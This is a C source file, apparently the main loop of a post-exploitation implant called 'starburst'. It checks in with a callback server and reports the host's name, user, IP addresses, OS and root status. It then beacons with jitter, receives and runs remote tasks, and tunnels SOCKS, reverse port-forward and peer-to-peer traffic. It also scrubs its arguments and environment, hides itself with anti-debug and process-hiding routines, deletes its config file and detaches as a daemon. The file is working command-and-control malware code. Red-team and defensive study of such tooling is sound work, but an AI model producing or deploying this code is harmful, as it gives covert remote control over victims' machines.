#include "starburst.h"

agent_state_t g_state;

/* ================================================================
 *  RESPONSE QUEUE (thread-safe)
 * ================================================================ */

void rsp_queue(const uint8_t *data, uint32_t dlen) {
    uint32_t needed = g_state.rsp_len + 4 + dlen;
    if (needed > g_state.rsp_cap) {
        uint32_t nc = g_state.rsp_cap == 0 ? 4096 : g_state.rsp_cap;
        while (nc < needed) nc *= 2;
        g_state.rsp_buf = (uint8_t *)realloc(g_state.rsp_buf, nc);
        g_state.rsp_cap = nc;
    }
    uint8_t *q = g_state.rsp_buf + g_state.rsp_len;
    q[0] = (dlen >> 24) & 0xFF;
    q[1] = (dlen >> 16) & 0xFF;
    q[2] = (dlen >> 8) & 0xFF;
    q[3] = dlen & 0xFF;
    memcpy(q + 4, data, dlen);
    g_state.rsp_len += 4 + dlen;
}

void queue_response(const char *task_uuid, uint8_t status, const char *output) {
    packer_t p;
    pk_init(&p);
    pk_byte(&p, ACTION_POST_RESPONSE);
    pk_string(&p, task_uuid);
    pk_byte(&p, status);
    pk_string(&p, output);

    pthread_mutex_lock(&g_state.rsp_mutex);
    rsp_queue(p.data, p.len);
    pthread_mutex_unlock(&g_state.rsp_mutex);

    pk_free(&p);
}

/* ================================================================
 *  CHECKIN
 * ================================================================ */

/* read username from /etc/passwd to avoid getpwuid NSS crash in static binaries */
static const char *lookup_username(uid_t uid, char *buf, size_t bufsz) {
    FILE *fp = fopen("/etc/passwd", "r");
    if (!fp) { snprintf(buf, bufsz, "%d", uid); return buf; }
    char line[512];
    while (fgets(line, sizeof(line), fp)) {
        char *name = line;
        char *p = strchr(name, ':');
        if (!p) continue;
        *p++ = '\0';
        p = strchr(p, ':'); /* skip password field */
        if (!p) continue;
        p++;
        int file_uid = atoi(p);
        if ((uid_t)file_uid == uid) {
            fclose(fp);
            strncpy(buf, name, bufsz - 1);
            buf[bufsz - 1] = '\0';
            return buf;
        }
    }
    fclose(fp);
    snprintf(buf, bufsz, "%d", uid);
    return buf;
}

/* read IPs from /proc/net/fib_trie or ip command */
static int gather_ips(char *ip_buf, size_t bufsz) {
    FILE *fp = popen("hostname -I 2>/dev/null || cat /proc/net/if_inet6 2>/dev/null | awk '{print $1}' || echo '127.0.0.1'", "r");
    if (!fp) { strncpy(ip_buf, "127.0.0.1", bufsz); return 1; }
    size_t rd = fread(ip_buf, 1, bufsz - 1, fp);
    ip_buf[rd] = '\0';
    pclose(fp);
    while (rd > 0 && (ip_buf[rd-1] == '\n' || ip_buf[rd-1] == ' '))
        ip_buf[--rd] = '\0';
    return 0;
}

static int do_checkin(void) {
    DBG("checkin: gathering host info");

    struct utsname uts;
    uname(&uts);

    char hostname[256] = "unknown";
    gethostname(hostname, sizeof(hostname));

    char username_buf[128];
    const char *username = lookup_username(getuid(), username_buf, sizeof(username_buf));

    char os_str[128];
    snprintf(os_str, sizeof(os_str), "%s %s", uts.sysname, uts.release);

    char ip_buf[512] = "";
    gather_ips(ip_buf, sizeof(ip_buf));

    int ip_count = 0;
    char *ips[32];
    char *tok = strtok(ip_buf, " \t");
    while (tok && ip_count < 32) { ips[ip_count++] = tok; tok = strtok(NULL, " \t"); }

    DBG("checkin: building TLV (ips=%d)", ip_count);
    packer_t p;
    pk_init(&p);
    pk_byte(&p, ACTION_CHECKIN);
    pk_string(&p, CFG_PAYLOAD_UUID);
    pk_int32(&p, (uint32_t)ip_count);
    for (int i = 0; i < ip_count; i++) pk_string(&p, ips[i]);
    pk_string(&p, os_str);
    pk_string(&p, username);
    pk_string(&p, hostname);
    pk_int32(&p, (uint32_t)getpid());
    pk_string(&p, "x64");
    pk_string(&p, "");
    pk_int32(&p, getuid() == 0 ? 4 : 2);
    pk_string(&p, "");

    char proc_name[256] = "starburst";
    {
        char link[64];
        snprintf(link, sizeof(link), "/proc/%d/exe", getpid());
        ssize_t rn = readlink(link, proc_name, sizeof(proc_name) - 1);
        if (rn > 0) proc_name[rn] = '\0';
    }
    pk_string(&p, proc_name);

    DBG("checkin: sending to %s:%d/%s", g_state.callback_host, g_state.callback_port, g_state.post_uri);
    uint32_t resp_len;
    uint8_t *resp = agent_send(p.data, p.len, &resp_len);
    pk_free(&p);
    DBG("checkin: agent_send returned %p len=%u", (void*)resp, resp_len);

    if (!resp || resp_len < 2) { free(resp); return -1; }

    parser_t rp;
    pr_init(&rp, resp, resp_len);
    uint8_t action = pr_byte(&rp);
    if (action != ACTION_CHECKIN_RSP) { free(resp); return -1; }

    char *callback_uuid = pr_string(&rp);
    strncpy(g_state.uuid, callback_uuid, 39);
    g_state.uuid[39] = '\0';

    free(callback_uuid);
    free(resp);
    return 0;
}

/* ================================================================
 *  BEACON LOOP
 * ================================================================ */

static void do_get_tasking(void) {
    if (g_state.rpfwd.active) rpfwd_poll();
    if (g_state.socks.active) socks_poll();
    tcp_p2p_poll_links();

    packer_t p;
    pk_init(&p);
    pk_byte(&p, ACTION_GET_TASKING);

    pthread_mutex_lock(&g_state.rsp_mutex);
    pk_int32(&p, g_state.rsp_len);
    if (g_state.rsp_len > 0) {
        pk_ensure(&p, g_state.rsp_len);
        memcpy(p.data + p.len, g_state.rsp_buf, g_state.rsp_len);
        p.len += g_state.rsp_len;
    }
    uint32_t sending = g_state.rsp_len;
    pthread_mutex_unlock(&g_state.rsp_mutex);

    DBG("beacon: sending %u bytes response data", sending);

    uint32_t resp_len;
    uint8_t *resp = agent_send(p.data, p.len, &resp_len);
    pk_free(&p);

    if (!resp || resp_len < 2) {
        DBG("beacon: send failed (resp=%p len=%u)", (void*)resp, resp_len);
        free(resp);
        return;
    }

    pthread_mutex_lock(&g_state.rsp_mutex);
    g_state.rsp_len = 0;
    pthread_mutex_unlock(&g_state.rsp_mutex);

    parser_t rp;
    pr_init(&rp, resp, resp_len);
    uint8_t action = pr_byte(&rp);
    if (action != ACTION_GET_TASKING) { free(resp); return; }

    uint32_t task_count = pr_int32(&rp);
    DBG("beacon: received %u tasks", task_count);

    for (uint32_t i = 0; i < task_count; i++) {
        uint8_t cmd_id = pr_byte(&rp);
        char task_uuid[40] = {0};
        pr_raw(&rp, (uint8_t *)task_uuid, 36);
        uint32_t params_len = pr_int32(&rp);
        const uint8_t *params_data = NULL;
        if (params_len > 0 && pr_remaining(&rp) >= params_len) {
            params_data = rp.data + rp.off;
            rp.off += params_len;
        }
        DBG("task: cmd=0x%02x uuid=%.8s params=%u", cmd_id, task_uuid, params_len);
        dispatch_task(cmd_id, task_uuid, params_data ? params_data : (uint8_t *)"", params_len);
    }

    /* parse delegate messages for P2P links */
    while (pr_remaining(&rp) > 0) {
        uint8_t section_action = pr_byte(&rp);
        if (section_action == ACTION_RPFWD_MSG && g_state.rpfwd.active) {
            uint32_t count = pr_int32(&rp);
            for (uint32_t ri = 0; ri < count; ri++) {
                uint32_t rid = pr_int32(&rp);
                uint8_t rexit = pr_byte(&rp);
                uint32_t rdata_len;
                const uint8_t *rdata = pr_bytes(&rp, &rdata_len);
                rpfwd_route(rid, (uint8_t *)rdata, rdata_len, rexit != 0);
            }
        } else if (section_action == ACTION_SOCKS_MSG && g_state.socks.active) {
            uint32_t count = pr_int32(&rp);
            for (uint32_t si = 0; si < count; si++) {
                uint32_t sid = pr_int32(&rp);
                uint8_t sexit = pr_byte(&rp);
                uint32_t sdata_len;
                const uint8_t *sdata = pr_bytes(&rp, &sdata_len);
                socks_route(sid, (uint8_t *)sdata, sdata_len, sexit != 0);
            }
        } else if (section_action == ACTION_LINK_MSG) {
            /* forward delegate messages to linked P2P agents */
            while (pr_remaining(&rp) > 0) {
                char *agent_uuid = pr_string(&rp);
                uint32_t msg_len;
                const uint8_t *msg_data = pr_bytes(&rp, &msg_len);

                tcp_link_t *link = g_state.tcp_links;
                while (link) {
                    if (strcmp(link->agent_id, agent_uuid) == 0 && link->connected) {
                        tcp_p2p_link_send(link, msg_data, msg_len);
                        break;
                    }
                    link = link->next;
                }
                free(agent_uuid);
            }
        } else {
            break;
        }
    }

    free(resp);
}

/* ================================================================
 *  CONFIG FILE
 * ================================================================ */

static void load_config_file(const char *path) {
    FILE *fp = fopen(path, "r");
    if (!fp) return;

    char line[512];
    while (fgets(line, sizeof(line), fp)) {
        size_t len = strlen(line);
        while (len > 0 && (line[len-1] == '\n' || line[len-1] == '\r')) line[--len] = '\0';

        char *eq = strchr(line, '=');
        if (!eq) continue;
        *eq = '\0';
        char *key = line, *val = eq + 1;

        if (strcmp(key, "uuid") == 0)          strncpy(g_state.uuid, val, 39);
        else if (strcmp(key, "aes_key") == 0)   hex_to_bytes(val, g_state.aes_key, 32);
        else if (strcmp(key, "host") == 0)       strncpy(g_state.callback_host, val, sizeof(g_state.callback_host) - 1);
        else if (strcmp(key, "port") == 0)       g_state.callback_port = atoi(val);
        else if (strcmp(key, "uri") == 0)        strncpy(g_state.post_uri, val, sizeof(g_state.post_uri) - 1);
        else if (strcmp(key, "sleep") == 0)      g_state.sleep_interval = atoi(val);
        else if (strcmp(key, "jitter") == 0)     g_state.sleep_jitter = atoi(val);
    }
    fclose(fp);
    unlink(path);
}

/* ================================================================
 *  MAIN
 * ================================================================ */

int main(int argc, char **argv) {
    signal(SIGPIPE, SIG_IGN);

    memset(&g_state, 0, sizeof(g_state));
    pthread_mutex_init(&g_state.rsp_mutex, NULL);
    pthread_mutex_init(&g_state.jobs_mutex, NULL);
    g_state.running = 1;
    g_state.tcp_listen_sock = -1;

    strncpy(g_state.uuid, CFG_PAYLOAD_UUID, 39);
    hex_to_bytes(CFG_AES_KEY_HEX, g_state.aes_key, 32);
    strncpy(g_state.callback_host, CFG_CALLBACK_HOST, sizeof(g_state.callback_host) - 1);
    g_state.callback_port = CFG_CALLBACK_PORT;
    strncpy(g_state.post_uri, CFG_POST_URI, sizeof(g_state.post_uri) - 1);
    g_state.sleep_interval = CFG_SLEEP_INTERVAL;
    g_state.sleep_jitter = CFG_SLEEP_JITTER;
    DBG("config loaded: %s:%d/%s", g_state.callback_host, g_state.callback_port, g_state.post_uri);

    if (argc > 1 && argv[1] && argv[1][0] != '-') {
        load_config_file(argv[1]);
    }

    DBG("ssl_init...");
    if (ssl_init() != 0) {
        DBG("ssl_init FAILED");
        return 1;
    }
    DBG("ssl_init OK");

    /* OPSEC: anti-debug, process hiding, environ scrub */
    DBG("opsec_init...");
    opsec_init();
    DBG("scrub_argv...");
    opsec_scrub_argv(argc, argv);
    opsec_scrub_environ();
    DBG("init complete");

#ifndef DEBUG_BUILD
    if (fork() > 0) _exit(0);
    setsid();
    if (fork() > 0) _exit(0);
    close(STDIN_FILENO);
    close(STDOUT_FILENO);
    close(STDERR_FILENO);
#endif

    srand((unsigned int)(time(NULL) ^ getpid()));

    while (g_state.running) {
        if (do_checkin() == 0) break;
        sleep(g_state.sleep_interval);
    }

    while (g_state.running) {
        if (g_state.killdate > 0 && (uint32_t)time(NULL) >= g_state.killdate) {
            g_state.running = 0;
            break;
        }

        DBG("loop: sleep_interval=%d jitter=%d", g_state.sleep_interval, g_state.sleep_jitter);
        do_get_tasking();

        int s = g_state.sleep_interval;
        if (s == 0) {
            usleep(50000);
        } else {
            if (g_state.sleep_jitter > 0) {
                int jitter = (s * g_state.sleep_jitter) / 100;
                if (jitter > 0) s += (rand() % (2 * jitter + 1)) - jitter;
                if (s < 1) s = 1;
            }
            DBG("loop: sleeping %d seconds", s);
            sleep((unsigned int)s);
        }
    }

    if (g_state.rsp_len > 0) do_get_tasking();

    tcp_p2p_destroy();
    if (g_state.rpfwd.active) rpfwd_destroy();
    if (g_state.socks.active) socks_destroy();
    if (g_state.ssl_ctx) SSL_CTX_free(g_state.ssl_ctx);
    free(g_state.rsp_buf);
    pthread_mutex_destroy(&g_state.rsp_mutex);
    pthread_mutex_destroy(&g_state.jobs_mutex);
    return 0;
}
